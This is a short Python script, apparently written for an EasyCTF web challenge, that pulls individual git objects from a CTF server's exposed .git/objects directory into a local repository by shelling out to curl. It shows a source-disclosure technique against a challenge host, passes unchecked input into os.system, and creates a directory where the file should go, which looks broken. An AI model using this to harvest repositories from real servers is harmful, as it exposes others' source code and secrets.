import os, sys

PATH = '/path/to/my/new/local/empty/.git/objects/'
URL = 'http://edge2.web.easyctf.com/.git/objects/'


def req(name):
    dir_name = name[:2] + '/'
    file_name = name[2:]
    
    path = PATH + dir_name + file_name
    url = URL + dir_name + file_name
    
    os.mkdir(path)
    os.system('curl {} > {}'.format(url, path))


if __name__ == '__main__':
            
    req(sys.argv[1])
